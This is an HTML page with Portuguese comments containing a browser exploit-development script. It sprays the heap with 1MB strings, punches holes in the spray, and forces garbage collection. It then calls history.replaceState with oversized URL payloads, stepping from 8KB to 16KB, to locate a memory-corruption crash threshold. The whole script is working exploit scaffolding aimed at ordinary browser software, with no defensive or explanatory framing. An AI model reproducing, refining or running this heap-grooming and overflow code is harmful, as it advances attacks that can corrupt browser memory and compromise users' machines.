<!DOCTYPE html>
<html>
<head>
    <title>Limit Breaker (8KB to 16KB)</title>
    <style>
        body { background-color: #000; color: #ff0055; font-family: monospace; padding: 20px; text-align: center; }
        
        #counter { 
            font-size: 80px; 
            color: #fff; 
            font-weight: bold; 
            border: 4px solid #ff0055;
            padding: 40px;
            margin: 20px;
            background: #220000;
        }

        button { 
            font-size: 30px; padding: 20px; width: 100%; border: none; background: #550000; color: #fff; font-weight: bold; cursor: pointer;
        }

        #log { text-align: left; margin-top: 20px; color: #aaa; font-size: 18px; }
    </style>
</head>
<body>

    <h1>LIMIT BREAKER</h1>
    <p>Subindo o overflow até bater no muro. O último número é o limite.</p>

    <div id="counter">PRONTO</div>

    <button onclick="startBreaker()">INICIAR PROGRESSÃO</button>
    
    <div id="log">Aguardando...</div>

    <script>
        const BASE_OFFSET = 709520; 
        
        // Intervalo da Morte
        const START_AMT = 8192;  // 8KB (Seguro)
        const END_AMT = 16384;   // 16KB (Fatal)
        const STEP = 64;         // Subir de 64 em 64 bytes

        // Configuração da Vítima (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function updateDisplay(val) {
            document.getElementById('counter').innerText = val + " bytes";
        }

        function log(msg) {
            document.getElementById('log').innerHTML = `<div>${msg}</div>` + document.getElementById('log').innerHTML;
        }

        async function startBreaker() {
            log(`Iniciando em ${START_AMT} bytes...`);
            
            for (let amt = START_AMT; amt < END_AMT; amt += STEP) {
                
                // ATUALIZA A TELA ANTES DE EXECUTAR
                // Se travar, este é o número que você vai ver congelado
                updateDisplay(amt);
                await new Promise(r => requestAnimationFrame(r)); // Força renderização

                // 1. Limpeza
                victims = [];
                await forceGC();

                try {
                    // 2. Spray (1MB)
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    const SPRAY_COUNT = 60; 
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 3. Buracos
                    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                    await forceGC();

                    // 4. EXPLOIT
                    // Se 'amt' for o limite, o crash acontece AQUI
                    await trigger(amt);

                    // Se chegou aqui, sobreviveu
                    log(`Passou: ${amt} bytes`);

                } catch(e) {
                    log("Erro (Ignorado): " + e.message);
                }

                // Pausa curta para o sistema processar
                await new Promise(r => setTimeout(r, 100));
            }
            log("Fim do range. Nenhum crash? (Estranho)");
        }

        function trigger(amount) {
            return new Promise(resolve => {
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // O TESTE:
                        // Enchemos com 0x01 até 'amount'.
                        // E colocamos 0xFF no final para garantir o crash se tocarmos em algo.
                        buffer += "\x01".repeat(amount);
                        buffer += "\xFF"; 

                        history.replaceState({}, "break_" + amount, "/" + buffer);
                        resolve();
                    } catch(e) { resolve(); }
                }, 50); // Delay curto
            });
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 200));
        }
    </script>
</body>
</html>
